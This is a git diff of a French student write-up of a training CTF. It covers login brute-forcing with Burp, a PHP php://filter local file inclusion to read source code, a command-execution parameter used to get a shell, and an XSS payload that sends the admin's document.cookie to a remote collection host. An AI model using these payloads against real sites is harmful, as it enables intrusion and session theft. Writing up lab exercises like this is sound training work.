@@ -1,4 +1,5 @@
 
+
 # SRS Capture The Flag
 Dans le cadre de l'UV SRS à l'IMT Lille Douai, Advens nous a proposé de participé à un CTF (Capture The Flag) afin de nous former aux techniques de ethical hacking.
 Ce document nous permettra d'expliquer les méthodes que nous avons employé pour résoudre les différents challenges de ce CTF. 
@@ -31,8 +32,23 @@ Ce challenge nous amène sur un site bloqué par la NSA et donc non-indexé. L'i
 La page d'identification renvois une erreur *wrong login* lorsque le login ne correspond pas à un utilisateur connu. Nous pouvons donc supposer qu'en testant tous les identifiants, nous arrivrons à un message du type *wrong password*, et donc une taille de réponse différente.
 Avec le logiciel Burp, nous allons intercepter une requête d'identification et faire varier uniquement le login en se servant du fichier `dict.txt`. On compare ensuite les tailles des réponses pour identifier le bon login [[screenshot]](https://raw.githubusercontent.com/migonidec/SRS_CTF/master/images/web/pentesterAdventures/pentesterAdventures_5.PNG). De la même manière, on peux identifier le mot de passe de la page pour arriver au coupe `qwertyui:security` [[screenshot]](https://raw.githubusercontent.com/migonidec/SRS_CTF/master/images/web/pentesterAdventures/pentesterAdventures_7.PNG). 
 
-On accède enfin à une page qui liste 2 liens : une capture d'un ping local et un fichier de configuration php à l'adresse suivante `/nsa-secure-scripts.php?script=scripts/phpinfos.php`
-//TODO
+On accède enfin à une page qui liste 2 liens : une capture d'un ping local et un fichier de configuration php à l'adresse suivante `/nsa-secure-scripts.php?script=scripts/phpinfos.php`. En se referant à cette [documentation](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/), on injecte `php://filter/convert.base64-encode/resource=nsa-secure-scripts.php` pour inspecter le code source de la page [[screenshot]](https://raw.githubusercontent.com/migonidec/SRS_CTF/master/images/web/pentesterAdventures/pentesterAdventures_9.PNG). C'est ainsi qu'on remarque le bloc de code suivant : 
+```
+if(isset($_GET['cmd_shell_params'])){
+	system($_GET['cmd_shell_params']);
+}
+```
+Grâce à cette option, on peut réussir à ouvrir un shell sur le serveur cible. Ainsi, on fait une recherche sur les fichiers `*.txt` pour localiser le flag et l'afficher sur la page web [[screenshot]](https://raw.githubusercontent.com/migonidec/SRS_CTF/master/images/web/pentesterAdventures/pentesterAdventures_11.PNG).
+
+### Cookie hacker
+La page de ce challenge nous permet de poster des messages et donc potentiellement de tenter une attaque XSS. Nous allons tenter de voler un cookie administrateur (fichier `document.cookie`) pour pouvoir nous identifier sur la page d'administration. 
+Cependant, le serveur étant en "maintenance", les messages d'injection XSS de type `<script>alert()</script>` ne sont pas envoyé par le serveur. Nous allons donc tenter d'injection un script permettant de rediriger le contenu du `document.cookie` vers un autre serveur : 
+```
+<script>
+	document.location="https://remoteadresse" + document.cookie;
+</script>
+```
+Grâce au site [Request Inspector](https://requestinspector.com/) nous allons pouvoir récupérer le resultat de notre script et donc récupérer le cookie administrateur. [[screenshot]](https://raw.githubusercontent.com/migonidec/SRS_CTF/master/images/web/cookieHacker/cookieHacker_2.PNG). Ensuite l'extension [Cookie Quick Manager](https://addons.mozilla.org/fr/firefox/addon/cookie-quick-manager/) nous permet d’éditer les cookies et d'injecter notre cookie volé. Une fois le cookie re-injecté, on obtient le flag du challenge.
 
 ## Forensic
 
